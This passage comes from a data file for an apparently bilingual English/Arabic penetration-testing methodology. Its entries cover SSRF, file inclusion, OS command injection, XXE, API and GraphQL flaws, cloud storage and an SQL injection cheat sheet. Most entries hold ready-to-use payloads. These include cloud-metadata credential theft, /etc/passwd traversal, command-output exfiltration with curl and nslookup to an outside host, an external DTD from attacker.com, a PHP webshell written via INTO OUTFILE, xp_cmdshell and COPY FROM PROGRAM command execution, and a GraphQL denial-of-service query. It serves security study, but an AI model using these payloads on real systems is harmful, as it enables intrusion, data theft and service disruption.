            ar: "تخطي الفلاتر: استخدام التمثيل العشري للأي بي (2130706433)، أو الـ IPv6 (::1)، أو إعادة التوجيه لتجاوز حماية الـ SSRF.",
            exploit: {
              en: 'If the server strictly blocks the string "127.0.0.1" or "localhost", you can use equivalent representations like `2130706433` (decimal) or `[::1]` (IPv6).',
              ar: 'إذا كان السيرفر يقوم بحظر الكلمات "localhost" أو "127.0.0.1"، يمكنك تحويل الـ IP إلى صيغة عشرية (Decimal) للتحايل على الحظر.',
            },
            code: ["http://2130706433/admin", "http://0177.0.0.1/"],
          },
          {
            en: "Cloud Metadata: Try fetching AWS/Azure/GCP metadata endpoints (e.g., http://169.254.169.254/latest/meta-data/) for cloud credentials.",
            ar: "بيانات الحوسبة السحابية (Cloud Metadata): استهداف مسارات البيانات الوصفية للسحابة مثل 169.254.169.254 لسرقة مفاتيح (AWS/GCP/Azure).",
            exploit: {
              en: "If the target is hosted on AWS, forcefully read the magical IP `169.254.169.254` to steal the IAM role credentials.",
              ar: "إذا كان الهدف مستضافاً على منصات سحابية (مثل أمازون أو جوجل)، حاول استدعاء الآي بي السحري `169.254.169.254` لاستخراج مفاتيح الوصول لحسابهم السحابي.",
            },
            code: [
              "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            ],
          },
          {
            en: "Blind SSRF: Use Burp Collaborator or a webhook to see if the server makes an out-of-band request to your domain.",
            ar: "SSRF الأعمى (Blind SSRF): استخدام Burp Collaborator لرؤية ما إذا كان الخادم يتواصل مع مسارك (Out-of-band) دون أن يظهر رد مباشر.",
            exploit: {
              en: "Insert a Burp Collaborator URL into all input fields (including headers like `Referer` or `X-Forwarded-Host`). If the target performs an HTTP request to your domain behind the scenes, you have Blind SSRF.",
              ar: "أدخل رابط (Webhook) أو (Burp Collaborator) في كافة حقول الإدخال والهيدرات. إذا قام سيرفر الضحية بإجراء عملية طلب (HTTP request) وظهرت في أداتك، فهذا يؤكد وجود ثغرة SSRF أعمى.",
            },
            code: [
              "GET / HTTP/1.1\nReferer: http://your-collaborator-id.oastify.com",
            ],
          },
        ],
        payloads: [
          "http://127.0.0.1:80",
          "http://2130706433/",
          "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
          "http://[::]:80/",
        ],
      },
      {
        title: {
          en: "4. Local/Remote File Inclusion (LFI / RFI)",
          ar: "4. إدراج الملفات وتجاوز المسارات (LFI / RFI)",
        },
        items: [
          {
            en: "Path Traversal: Use ../ sequences to access sensitive OS files (e.g., /etc/passwd or C:\\Windows\\win.ini).",
            ar: "تجاوز المسارات (Path Traversal): استخدام متتالية ../ للوصول إلى ملفات النظام الحساسة مثل /etc/passwd.",
            exploit: {
              en: "Identify parameters that load files (e.g. `?file=`, `?page=`, `?doc=`). Insert Directory Traversal sequences (`../`) to move up the directory tree and read core OS files like `/etc/passwd` on Linux or `win.ini` on Windows.",
              ar: "استهدف المعلمات التي تقوم باستدعاء ملفات (مثل `?file=`). استخدم التسلسل التراجعي (`../`) للعودة في مسار المجلدات ومحاولة قراءة ملفات حساسة كـ `/etc/passwd`.",
            },
            code: [
              "?file=../../../../../../../../etc/passwd",
              "?page=..%2f..%2f..%2f..%2fetc%2fpasswd",
            ],
          },
          {
            en: "PHP Wrappers: Use php://filter/read=convert.base64-encode/resource=index.php to read backend source code instead of executing it.",
            ar: "فلاتر PHP (PHP Wrappers): استخدام فلاتر التحويل بصيغة Base64 لقراءة الأكواد المرجعية (Source Code) لملفات PHP دون تنفيذها.",
            exploit: {
              en: "If the server is running PHP and the `include()` logic is vulnerable, use PHP wrappers to encode the target file in Base64. This prevents the server from executing the PHP code, allowing you to steal the raw source code.",
              ar: "إذا كان الموقع مبنياً على PHP، استخدم الفلتر `php://filter` وبصيغة `Base64`. هذا سيمنع السيرفر من تنفيذ كود الـ PHP، وسيقوم بعرض الكود المصدري لك لتستخرج منه بيانات هامة ككلمات المرور.",
            },
            code: [
              "?page=php://filter/read=convert.base64-encode/resource=config.php",
            ],
          },
          {
            en: "Null Byte Bypass: Append %00.png to the sequence to bypass application logic checking for a specific extension (works on older PHP versions).",
            ar: "تخطي امتداد الملفات (Null Byte): استخدام %00 في نهاية المسار لتجاهل الإضافات (Extensions) التي يفرضها الكود.",
            exploit: {
              en: "If the backend appends `.php` or validates extensions (like asserting it must be `.jpg`), inject a Null Byte (`%00`) before the extension. The underlying C runtime will stop reading at the Null Byte.",
              ar: "إذا كان المبرمج يُجبر الكود على إضافة امتداد مُعين (مثل `.php` في نهايته)، أضف الـ Null Byte (`%00`) قبل الامتداد. سيتجاهل الخادم كل ما يأتي بعده.",
            },
            code: ["?file=../../../../etc/passwd%00.png"],
          },
        ],
        payloads: [
          "../../../../../../../../etc/passwd",
          "php://filter/read=convert.base64-encode/resource=config.php",
          "../../../../etc/passwd%00.jpg",
        ],
      },
      {
        title: {
          en: "5. OS Command Injection",
          ar: "5. حقن أوامر النظام (OS Command Injection)",
        },
        items: [
          {
            en: "Operator Chaining: Inject command delimiters (; , | , || , &&) into input fields that might be passed to a system shell.",
            ar: "استخدام فواصل الأوامر: استخدام معاملات مثل (; أو | أو &&) لحقن أوامر في معلمات قد يتم تمريرها إلى نظام التشغيل.",
            exploit: {
              en: "If an application uses user input to ping an IP or fetch a file using backend shell commands, inject shell delimiters (like `;` or `|`) followed by your command to execute it independently.",
              ar: "إذا كان التطبيق يأخذ مُدخلك لتشغيل أمر على النظام (كأداة Ping)، قم بإنهاء الأمر الأول باستخدام فواصل النظام (`|` أو `;`) ثم ألحق أمرك الخبيث ليتم تنفيذه.",
            },
            code: ["127.0.0.1; cat /etc/passwd", "127.0.0.1 | whoami"],
          },
          {
            en: "Blind / Time-Based: Inject ping -c 10 127.0.0.1 and check if the HTTP response takes exactly 10 seconds.",
            ar: "الحقن الزمني الأعمى: حقن أمر ping لملاحظة التغير في تأخير استجابة الخادم وتأكيد الحقن.",
            exploit: {
              en: "When the command results are not printed on the screen (Blind), supply a command that sleeps or pings localhost. A consistent delay in the HTTP response proves execution.",
              ar: "عندما لا يُظهر لك التطبيق مخرجات النظام، دمج أمرك مع دوال تُسبب تأخيراً (مثل `ping -c 10`). إذا استغرق الطلب 10 ثوانٍ ليعود، فهذا يؤكد وجود الثغرة.",
            },
            code: ["test@email.com; ping -c 10 127.0.0.1", "|| sleep 10"],
          },
          {
            en: "Out-Of-Band (OOB) Extraction: Pipe command output to a DNS request (e.g., `whoami`.attacker.com) if the response is blind.",
            ar: "استخراج البيانات عبر قناة خارجية (OOB): توجيه الاستجابة لطلب DNS خارجي للتحقق في حال لم يظهر الناتج في الرد المباشر.",
            exploit: {
              en: "Use tools like `curl`, `wget`, or `nslookup` (combined with backticks or `$(...)` for sub-execution) to send the command output to your Burp Collaborator domain.",
              ar: "استخدم أدوات النظام (مثل `wget` أو `nslookup`) لإرسال مخرجات الأوامر كطلب خارجي (DNS/HTTP Request) إلى خادمك، لتجاوز حقيقة أن الحقن أعمى.",
            },
            code: [
              "; nslookup `whoami`.your-collaborator.com",
              "| curl http://your-collaborator.com/$(id | base64)",
            ],
          },
        ],
        payloads: [
          "; ping -c 5 127.0.0.1",
          "| whoami",
          "`whoami`.your-collaborator.com",
        ],
      },
      {
        title: {
          en: "6. XML External Entity (XXE)",
          ar: "6. كيانات XML الخارجية (XXE)",
        },
        items: [
          {
            en: "Classic XXE: Inject an external SYSTEM entity pointing to a local file, and reference it in the XML body.",
            ar: "هجوم XXE الكلاسيكي: حقن كيان نظام خارجي يقرأ ملفاً محلياً، ثم استدعاء الكيان ضمن محتوى الـ XML.",
            exploit: {
              en: "Define a custom XML `ENTITY` using the `SYSTEM` keyword to reference a local file. Then, use this entity inside one of the XML tags that gets directly printed back in the response.",
              ar: "قم بتعريف كيان جديد (ENTITY) باستخدام كلمة `SYSTEM` للإشارة إلى ملف محلي، ثم استدعِ هذا الكيان داخل أي حقل يُقوم السيرفر بإعادة طباعته على الشاشة.",
            },
            code: [
              '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<root><name>&xxe;</name></root>',
            ],
          },
          {
            en: "Content-Type Mismatch: Change Content-Type from application/json to application/xml, supply XML body, and see if the backend parses it.",
            ar: "تبديل أنواع المحتوى: قم بتغيير نوع بيانات الطلب من JSON إلى XML وأرسل حمولة (Payload) للتحقق مما إذا كان الخادم سيقرأه.",
            exploit: {
              en: "Even if the API expects JSON, try overriding the `Content-Type: application/xml` header and format the body as XML. Many backend libraries auto-parse XML by default if supplied.",
              ar: "حتى لو كان الـ API يطلب منك JSON، حاول تغيير رأس الطلب إلى `Content-Type: application/xml` وأرسل كود XML لاختبار ما إذا كان المُحلل (Parser) سيستقبله بصدر رحب.",
            },
            code: [
              'POST /api/v1/data HTTP/1.1\nContent-Type: application/xml\n\n<?xml version="1.0"?>\n<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>\n<root>&test;</root>',
            ],
          },
          {
            en: "OOB XXE/Blind: Use a malicious DTD hosted on your server to exfiltrate the file content via URL parameters matching.",
            ar: "هجوم XXE الأعمى (OOB): استخدم ملف DTD خارجي لاستخراج البيانات المخفية وتمريرها إجبارياً عبر خادمك.",
            exploit: {
              en: "If the server does not return the XML parsed data, you invoke a remote `.dtd` file on your server that performs Parameter Entity trickery to send the file content to your HTTP listener.",
              ar: "في حال كان الـ XXE أعمى، استدعِ ملف `.dtd` من سيرفرك. هذا الملف سيقرأ الملف من خادم الضحية ثم يُرسله كمسار فرعي ضمن طلب HTTP إلى سيرفرك.",
            },
            code: [
              '<!DOCTYPE data [ <!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd"> %remote; ]>',
            ],
          },
        ],
        payloads: [
          '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>',
        ],
      },
    ],
  },
  {
    id: "api-graphql",
    title: {
      en: "API, GraphQL & Cloud Security",
      ar: "واجهات برمجة التطبيقات (API) وتقنيات GraphQL",
    },
    iconName: "Server",
    description: {
      en: "Complete methodology for API security covering OWASP API Top 10 (BOLA, BFLA, Mass Assignment, etc.) and GraphQL.",
      ar: "منهجية متكاملة لأمن واجهات الـ API تغطي أخطر الثغرات (BOLA, Mass Assignment, إلخ) وتقنيات GraphQL.",
    },
    steps: [
      {
        title: {
          en: "1. Broken Object Level Authorization (BOLA / IDOR in APIs)",
          ar: "1. اختراق صلاحيات الكائنات (BOLA / IDOR)",
        },
        items: [
          {
            en: "ID Replacement: Substitute predictable resource IDs with random or sequential ones in endpoints like /api/v1/users/uid or /api/v1/orders/123.",
            ar: "استبدال المعرفات: تبديل المعرفات (IDs) في روابط API مثل /api/users/123 بأرقام أخرى عشوائية أو تسلسلية.",
            exploit: {
              en: "Intercept the request using a proxy like Burp Suite and modify the numeric or string ID in the URL path or JSON body to equal the target's ID.",
              ar: "اعترض الطلب باستخدام Burp Suite واستبدل المُعرف في الرابط أو في رسالة الـ JSON برقم حساب ضحية للتحقق من الاستجابة.",
            },
            code: [
              "GET /api/v1/users/1025 HTTP/1.1\nHost: api.target.com\nAuthorization: Bearer <your_token>\n--> Change 1025 to 1026",
            ],
          },
          {
            en: "HPP / Parameter Pollution: Provide multiple IDs for a single object ?id=mine&id=victim to bypass first check and act on the second.",
            ar: "تلوث المعلمات المزدوج (HPP): تزويد الـ API بمعرفين ?id=mine&id=victim لتخطي طبقة الفحص والتأثير على الضحية.",
            exploit: {
              en: "Add the target parameter twice in the URL string or JSON body. The WAF might check the first ID, but the backend API script processes the second ID.",
              ar: "أضف المعلمة (Parameter) مرتين داخل الرابط. قد يقوم جدار الحماية بالتحقق من الـ ID الأول، بينما ينفذ التطبيق الـ ID الثاني التابع للضحية.",
            },
            code: [
              "GET /api/v1/profile?id=my_id&id=victim_id HTTP/1.1",
              '{"user_id": 101, "user_id": 102}',
            ],
          },
          {
            en: "Method Override: If GET /api/users/uid fails, try sending POST or PUT along with headers like X-HTTP-Method-Override: GET.",
            ar: "تخطي حماية الصلاحيات باستخدام هيدر التجاوز: إذا فشلت، أضف هيدر X-HTTP-Method-Override: GET.",
            exploit: {
              en: "Send a permitted HTTP method (e.g. POST) to bypass routing rules, then use an override header to execute the blocked method (e.g. PUT/DELETE) at the application level.",
              ar: "استخدم نوع طلب مسموح (مثل POST) لتمرير الطلب من الدفاعات الأولية، ثم استخدم الهيدرات لإجبار التطبيق على تنفيذ طلب ممنوع كـ DELETE.",
            },
            code: [
              "POST /api/v1/users/102 HTTP/1.1\nX-HTTP-Method-Override: DELETE\nX-Method-Override: DELETE",
            ],
          },
          {
            en: "UUID/GUID Testing: If IDs are complex UUIDs, search all other API responses (like search, profiles) to find leaks of victim UUIDs.",
            ar: "فحص الـ UUIDs وتسريبها: إذا كانت المعرفات مشفرة، ابحث في تفاصيل طلبات (Search, Comments) حيث قد تتسرب معرفات تخص الضحية.",
            exploit: {
              en: "Review past HTML/JSON responses in Burp history. UUIDs are impossible to brute force. You strictly need an endpoint that leaks them (e.g. searching user by email might return their UUID).",
              ar: "لا يمكن تخمين الـ UUID لذلك تحتاج فحص استجابات التطبيق في بحث المستخدمين أو التعليقات لاصطياد معرف UUID خاص بالضحية لاستخدامه في ثغرات BOLA.",
            },
            code: [
              "GET /api/v1/comments/user_search?email=victim@target.com HTTP/1.1",
            ],
          },
        ],
      },
      {
        title: {
          en: "2. Broken Function Level Authorization (BFLA)",
          ar: "2. تخطي صلاحيات مستوى الوظائف (BFLA)",
        },
        items: [
          {
            en: "Accessing Admin APIs: Force-browse administrative endpoints like /api/admin/users as a regular user.",
            ar: "الوصول المباشر: محاولة طلب مسارات إدارية مثل /api/admin/ كعضو عادي وبدون صلاحيات.",
            exploit: {
              en: "Change your role-based endpoint to an admin/manager endpoint. If you have `GET /api/user/v1/profile`, test `GET /api/admin/v1/users` with your low-privilege token.",
              ar: "جرب الوصول إلى روابط مخصصة للمدراء (مثل /api/admin/users) باستخدام مفتاح مصادقة (Token) لحساب مستخدم عادي.",
            },
            code: [
              "GET /api/v1/admin/dashboard HTTP/1.1\nCookie: session_id=<normal_user_session>",
            ],
          },
          {
            en: "Changing HTTP Methods: Changing a standard GET /api/users/profile request to DELETE /api/users/profile or PUT to escalate privilege.",
            ar: "تغيير نوع الطلب (HTTP Methods): تغيير نوع الطلب من GET الخاص بالعرض إلى PUT أو DELETE لمحاولة التعديل.",
            exploit: {
              en: "If the API restricts creating/updating but allows reading, try to forge requests to the same endpoint with POST, PUT, PATCH, or DELETE methods.",
              ar: "إذا كان المسار يسمح بالقراءة فقط (GET)، قم بتغيير الطلب إلى POST أو DELETE أو PUT لمعرفة ما إذا كان تخويل هذه الدوال مفقوداً.",
            },
            code: [
              "DELETE /api/v1/users/102 HTTP/1.1\nAuthorization: Bearer <normal_user_token>",
              'PUT /api/v1/users/102 HTTP/1.1\n\n{"role":"admin"}',
            ],
          },
        ],
      },
      {
        title: {
          en: "3. Mass Assignment & Improper Data Filtering",
          ar: "3. التعيين الشامل (Mass Assignment) وتسريب البيانات",
        },
        items: [
          {
            en: 'Mass Assignment: Blindly inject sensitive parameters in JSON bodies like {"email": "...", "isAdmin": true, "role": "admin"} during user creation or update.',
            ar: 'التعيين الشامل: حقن حقول مخفية كصلاحيات الإدارة ("isAdmin": true, "role": "admin") أثناء التسجيل أو تحديث الحساب.',
            exploit: {
              en: "Identify the object properties via GET request, then try to update uneditable properties (like `role`, `balance`, `is_verified`) by supplying them in a PUT or POST payload.",
              ar: "تحقق من أسماء الحقول من خلال استجابة الـ GET (مثل role أو balance) ثم قم بوضعها في تحديث ملفك الشخصي عبر PUT/POST وراقب ما إذا تم اعتماد القيمة المدخلة.",
            },
            code: [
              'PUT /api/v1/users/me HTTP/1.1\n\n{"username": "test1", "role": "admin", "is_verified": true}',
            ],
          },
          {
            en: "Excessive Data Exposure: Check API responses. Even if the UI shows 3 fields, the backend might return 20 fields including passwords, PII, or internal tokens.",
            ar: "كشف البيانات المفرط: فحص استجابات ה־API بالكامل، قد تكون واجهة المستخدم تعرض فقط الاسم، ولكن الـ API يرسل (Tokens, Passwords, etc) مخفية في الرد.",
            exploit: {
              en: "Do not rely on the browser UI. Always inspect the raw JSON response in your proxy to see if sensitive keys like `password_hash`, `reset_token`, or `ssn` are being returned.",
              ar: "لا تعتمد على واجهة المستخدم. ابحث دائماً في استجابات الـ JSON في Burp عن أي بيانات سرية أو رموز استعادة أو أرقام هوية مسترجعة عن طريق الخطأ.",
            },
            code: [
              'HTTP/1.1 200 OK\n\n{"id": 1, "username": "admin", "password_hash": "e10adc394...", "reset_token": "4521..."}',
            ],
          },
        ],
        payloads: [
          '{"username":"test", "role":"admin"}',
          '{"email":"test@x.com", "is_verified": true}',
          '{"permissions": ["admin", "super"]}',
        ],
      },
      {
        title: {
          en: "4. API Versioning & Improper Assets Management",
          ar: "4. إصدارات API القديمة واختبار الأصول غير الموثقة",
        },
        items: [
          {
            en: "Version Downgrade: Change /api/v2/ or /api/v3/ endpoints back to /api/v1/ or /api/mobile/ to access deprecated and insecure business logic.",
            ar: "الرجوع للإصدار القديم: تغيير مسارات مثل /api/v3/ إلى /api/v1/ للوصول لمسارات قديمة خالية من الحمايات، أو تخطي التحقق من الـ Rate Limit.",
            exploit: {
              en: "If `POST /api/v2/login` requires OTP or has rate-limits, change the URL to `POST /api/v1/login` or `POST /api/mobile/login` which might still be active and unprotected.",
              ar: "إذا كان المسار الحديث (v2) محمي بـ OTP، قم بتغيير الدليل في الرابط إلى v1 أو mobile لتخطي هذه القيود إذا كان المسار القديم لا زال يعمل.",
            },
            code: [
              'POST /api/v1/login HTTP/1.1\n\n{"username":"admin", "password":"password"}',
            ],
          },
          {
            en: "Hidden Endpoints (Fuzzing): Fuzz API base URLs to discover undocumented endpoints (e.g., /api/internal, /api/dev, /api/staging).",
            ar: "اكتشاف المسارات المخفية: استخدام الفازينج (Fuzzing) لإيجاد مسارات غير موثقة مثل /api/dev أو /api/internal.",
            exploit: {
              en: "Use tools like ffuf to fuzz directories. Often directories like `/api/admin` or `/api/internal` don't enforce the same authentication headers as the public API.",
              ar: "استخدم أدوات التخمين مثل ffuf على المسارات، عادةً ما تكون المسارات الداخلية تخلو من طلب المصادقة (Tokens).",
            },
            code: [
              "ffuf -u https://api.target.com/api/FUZZ/users -w api-wordlist.txt",
            ],
          },
          {
            en: "Exposed Swagger/OpenAPI: Look for missing authentication on specification files (e.g., /swagger-ui.html, /openapi.json, /v2/api-docs) for full API maps.",
            ar: "تسريب ملفات التوثيق: البحث عن ملفات Swagger و OpenAPI المكشوفة مثل /openapi.json لاستخراج خريطة الـ API بالكامل.",
            exploit: {
              en: "Navigate to common documentation paths using your browser or a wordlist. It will map out all the hidden parameters and deprecated endpoints.",
              ar: "ابحث عن مسارات الـ swagger أو openapi لتستخرج كافة مسارات الـ API المخفية التي لا يتم استدعاؤها في واجهة المستخدم الأمامية.",
            },
            code: [
              "GET /api/v1/swagger-ui.html HTTP/1.1",
              "GET /v2/api-docs HTTP/1.1",
            ],
          },
        ],
      },
      {
        title: {
          en: "5. GraphQL Vulnerabilities",
          ar: "5. ثغرات قراف كيو إل (GraphQL)",
        },
        items: [
          {
            en: "Introspection Query: Send an Introspection query to extract the entire backend GraphQL schema. Discover hidden queries and mutations.",
            ar: "استعلام الاستبطان (Introspection): إرسال استعلام Introspection لاستخراج المخطط (Schema) بالكامل وكشف جميع الدوال المخفية.",
            exploit: {
              en: "Send a standard Introspection query `__schema` to the `/graphql` endpoint. If successful, you will dump the entire API documentation.",
              ar: "أرسل طلب استعلام يطلب فيها إظهار `__schema`. إذا كان مفعلاُ، سيقوم السيرفر بإرجاع كافة دوال النظام.",
            },
            code: [
              '{"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name fields { name } } } }"}',
            ],
          },
          {
            en: "Query Batching / Rate Limit Bypass: Send an array of identical mutation queries (with varying payloads) in a single HTTP request to bypass login brute-force protections.",
            ar: "تخطي قيود الطلبات (Query Batching): جمع عدة استعلامات/كلمات مرور في طلب (Request) واحد لتخطي جدار الحماية للبروت فورس.",
            exploit: {
              en: "In GraphQL, you can send an array of JSON objects `[{query1}, {query2}]` to execute multiple mutations in a single HTTP request, evading standard WAF rate limits.",
              ar: "في GraphQL، يمكنك التخمين على آلاف كلمات المرور في طلب HTTP واحد عن طريق إرسال قائمة من الأوامر في محتوى الـ JSON لتخطي جدار الحماية للريت ليميت.",
            },
            code: [
              '[{"query":"mutation{login(user:\\"admin\\",pass:\\"123\\"){token}}"}, {"query":"mutation{login(user:\\"admin\\",pass:\\"456\\"){token}}"}]',
            ],
          },
          {
            en: "Nested / Deep Queries: Perform highly nested queries to cause resource exhaustion (Denial of Service - DoS).",
            ar: "الهجمات المتداخلة (DoS): إرسال كميات هائلة من الاستعلامات المعقدة والمتداخلة لتسبيب شلل وتعطل للخادم بسبب استنفاذ الموارد.",
            exploit: {
              en: "Request relationships recursively: `author -> posts -> author -> posts -> author...` until the backend CPU/Memory crashes.",
              ar: "اطلب بيانات متداخلة ومكررة بشكل لا نهائي (الكاتب -> المقالات -> الكاتب -> المقالات) حتى يتوقف قاعدة بيانات الخادم عن العمل وتحدث ثغرة حجب الخدمة.",
            },
            code: [
              '{"query": "query { author(id:1) { posts { author { posts { author { name } } } } } }"}',
            ],
          },
        ],
      },
      {
        title: {
          en: "6. Cloud Storage & CI/CD Secrets",
          ar: "6. التخزين السحابي وتسريب أسرار CI/CD",
        },
        items: [
          {
            en: "Insecure S3 Buckets: Append bucket names to S3 URLs to see if standard files lack List or Read restrictions. Try to PUT a file.",
            ar: "حاويات S3 المكشوفة: ابحث عن حاويات Amazon S3 وحاول استعراض المفاتيح والملفات أو السيطرة برفع (PUT) ملف.",
            exploit: {
              en: "Identify the S3 bucket associated with the domain. Use AWS CLI to check if it allows anonymous listing or writing.",
              ar: "استخدم AWS CLI لمحاولة عرض قائمة المفاتيح في الحاوية عبر الأمر `ls` أو رفع ملف خبيث عبر الأمر `cp`.",
            },
            code: [
              "aws s3 ls s3://target-bucket-name --no-sign-request",
              "aws s3 cp mal.html s3://target-bucket-name/ --no-sign-request",
            ],
          },
          {
            en: "Exposed Env Files / Git / Cloud Configs: Feroxbuster for /.git/config, /.env, or internal CI/CD config files on static cloud hosts to extract hardcoded API Keys.",
            ar: "تسريب ملفات البيئة والمصادر: ابحث عن مسارات مثل /.env و /.git/ لاستخراج مفاتيح API السرية أو ملفات CI/CD.",
            exploit: {
              en: "Use directory brute forcing tools targeting specific configuration extensions (.env, .git, .json, .yml) to recover cloud database keys and Stripe secrets.",
              ar: "استخدم أدوات مثل Dirsearch لفحص الجذور المخفية (مثل /.env) واستخراج كلمات المرور المشفرة الخاصة بخدمات جوجل وأمازون.",
            },
            code: [
              "feroxbuster -u https://target.com -w common-configs.txt -x env,git,json,yml",
            ],
          },
        ],
      },
    ],
  },
  {
    id: "sqli-cheatsheet",
    title: {
      en: "Advanced SQLi & Cheat Sheet",
      ar: "موسوعة حقن قواعد البيانات (SQLi Cheat Sheet)",
    },
    iconName: "Database",
    description: {
      en: "Comprehensive cheat sheet for SQL Injection covering MySQL, PostgreSQL, SQL Server, Oracle, WAF bypass, and extraction methods.",
      ar: "مرجع شامل لحقن قواعد البيانات يغطي MySQL و PostgreSQL و SQL Server و Oracle، بالإضافة لطرق تخطي الحماية والاستخراج المتقدم.",
    },
    steps: [
      {
        title: { en: "1. MySQL Injection", ar: "1. حقن MySQL" },
        items: [
          {
            en: "Version & DB Info: Extract exact database versions and current database names.",
            ar: "معلومات الإصدار وقاعدة البيانات: استخراج الإصدار الدقيق واسم قاعدة البيانات الحالية.",
            exploit: {
              en: "Use specific MySQL functions like @@version and database() to gather basic intelligence about the system backend.",
              ar: "استخدم دوال خاصة بـ MySQL كـ @@version للنسخة، و database() للمسار.",
            },
            code: ["SELECT @@version", "SELECT database()", "SELECT user()"],
          },
          {
            en: "String Concatenation: Combine multiple columns into one output.",
            ar: "دمج السلاسل النصية: دمج عدة أعمدة وأسطر في مخرج واحد (Concat).",
            exploit: {
              en: "In MySQL, you cannot use || for strings by default. You must use CONCAT(), GROUP_CONCAT() or CONCAT_WS() to merge data.",
              ar: "في MySQL، لا يمكن دمج النصوص بعلامة || بشكل تلقائي. يجب استخدام CONCAT أو GROUP_CONCAT لتحقيق ذلك.",
            },
            code: [
              "SELECT CONCAT(username, ':', password) FROM users",
              "SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata",
            ],
          },
          {
            en: "Reading/Writing Files (MySQL): If FILE privileges are enabled, read internal files or write a webshell.",
            ar: "قراءة وكتابة الملفات: قراءة أو كتابة ملفات الخادم، مثل رفع شيل (Webshell) إن كانت الصلاحيات تامة.",
            exploit: {
              en: "Use LOAD_FILE() to read /etc/passwd or INTO OUTFILE to write a PHP webshell. Requires the `secure_file_priv` variable to be empty.",
              ar: "اقرأ الملفات عبر LOAD_FILE()، أو اكتب ملفات خبيثة كشيل PHP عبر INTO OUTFILE (تتطلب صلاحية secure_file_priv).",
            },
            code: [
              "SELECT LOAD_FILE('/etc/passwd')",
              "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'",
            ],
          },
        ],
      },
      {
        title: { en: "2. PostgreSQL Injection", ar: "2. حقن PostgreSQL" },
        items: [
          {
            en: "Version & DB Info: Use specific PostgreSQL functions.",
            ar: "معلومات الإصدار وقاعدة البيانات: دوال PostgreSQL للكشف عن الخادم.",
            exploit: {
              en: "PostgreSQL provides version() and current_database() to footprint the backend.",
              ar: "توفر PostgreSQL دوال version() و current_database() لاستخراج بيانات الخادم الأساسية.",
            },
            code: ["SELECT version()", "SELECT current_database()"],
          },
          {
            en: "Command Execution (CVE-2019-9193/COPY TO): Execute OS commands directly through PostgreSQL queries.",
            ar: "تأكيد التشغيل البرمجي وتشغيل الأوامر (Command Execution): تشغيل أوامر النظام مباشرة باستخدام PostgreSQL (نسخ من 9.3 وما فوق).",
            exploit: {
              en: "If the database connection relates to a superuser account, you can create a table, and run the `COPY ... FROM PROGRAM` command to execute OS commands (like RCE/shells).",
              ar: "لو كان الاتصال كحساب Superuser في PostgreSQL (9.3+)، يمكنك تشغيل أوامر نظام مباشرة مثل الشيل الخبيث عبر `COPY FROM PROGRAM`.",
            },
            code: [
              "DROP TABLE IF EXISTS cmd_exec;",
              "CREATE TABLE cmd_exec(cmd_output text);",
              "COPY cmd_exec FROM PROGRAM 'id';",
              "SELECT * FROM cmd_exec;",
            ],
          },
          {
            en: "Time-Based: specific delay functions for PostgreSQL.",
            ar: "الحقن الزمني: دوال التوقيف الخاصة بـ PostgreSQL.",
            exploit: {
              en: "PostgreSQL uses pg_sleep() instead of SLEEP() or WAITFOR DELAY.",
              ar: "يتم استخدام دوال التوقيف pg_sleep() هنا.",
            },
            code: ["SELECT pg_sleep(10)"],
          },
        ],
      },
      {
        title: {
          en: "3. Microsoft SQL Server (MSSQL)",
          ar: "3. حقن SQL Server (MSSQL)",
        },
        items: [
          {
            en: "Version & System Data: Extract MSSQL specific meta-data.",
            ar: "استخراج دوال ومعلومات MSSQL: معرفة نسخة الخادم واسمه.",
            exploit: {
              en: "Execute `@@version` or query `host_name()` and `db_name()` in MSSQL targets.",
              ar: "استخدم @@version أو db_name() لاكتشاف نسخة SQL Server.",
            },
            code: ["SELECT @@version", "SELECT db_name()"],
          },
          {
            en: "OS Command Execution (xp_cmdshell): Turn SQL injection into full system RCE.",
            ar: "تشغيل أوامر النظام (RCE) عبر xp_cmdshell: تحويل الحقن إلى تحكم كامل بالسيرفر.",
            exploit: {
              en: "If `xp_cmdshell` is enabled, or if you can enable it via `sp_configure`, you can execute arbitrary Windows/system commands straight from the SQL injection.",
              ar: "إن كان xp_cmdshell مُفَعَّلاً، بإمكانك تشغيل أوامر نظام مباشرة لفتح اتصال عكسي أو إضافة مستخدمين بالنظام.",
            },
            code: [
              "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
              "EXEC xp_cmdshell 'whoami'",
            ],
          },
          {
            en: "Error-Based (Data Type Conversion): Coerce the DB to throw an error revealing your data.",
            ar: "تحويل الأنواع البرمجية للخطأ الأعمى (Data Type Conversion Error): إجبار MSSQL على عرض المعلومات عبر أخطاء التحويل.",
            exploit: {
              en: "By forcing MSSQL to convert an alphanumeric string (the query result) to an Integer type, it will crash and print out the string in the error message.",
              ar: 'حين يتم إجبار MSSQL لتحويل نصوص (كالأسماء) لأرقام (INT)، سينهار النظام ويطبع الجواب الصريح كرسالة خطأ لتسريبه لك (مثال Error: failed to convert varchar "admin" to int).',
            },
            code: ["1' AND 1=CONVERT(int, (SELECT @@version))--"],
          },
        ],
      },
      {
        title: { en: "4. Oracle Databases", ar: "4. قواعد بيانات Oracle" },
        items: [
          {
            en: "DUAL Table Requirement: Oracle must have a FROM clause.",
            ar: "شروط جداول DUAL: قواعد بيانات أوراكل تتطلب وجود مُحدد الجداول كـ FROM.",
            exploit: {
              en: "In Oracle SQL, you cannot just do `SELECT 1`. You MUST finish the layout with `FROM DUAL`.",
              ar: "في أوراكل، لا ينفع كتابة SELECT 1 بل يجب دائماً إلحاقها بـ FROM DUAL (الجدول الوهمي للأوراكل).",
            },
            code: [
              "SELECT * FROM v$version",
              "SELECT 1 FROM dual",
              "SELECT user FROM dual",
            ],
          },
          {
            en: "Data Extraction: Concat strings safely using || in Oracle.",
            ar: "استخراج البيانات وربطها: استخدام || لربط النصوص في Oracle.",
            exploit: {
              en: "Oracle uses `||` as the default string concatenation operator.",
              ar: "أوراكل تستخدم شرطتي || لدمج النصوص.",
            },
            code: ["SELECT username || ':' || password FROM all_users"],
          },
        ],
      },
      {
        title: {
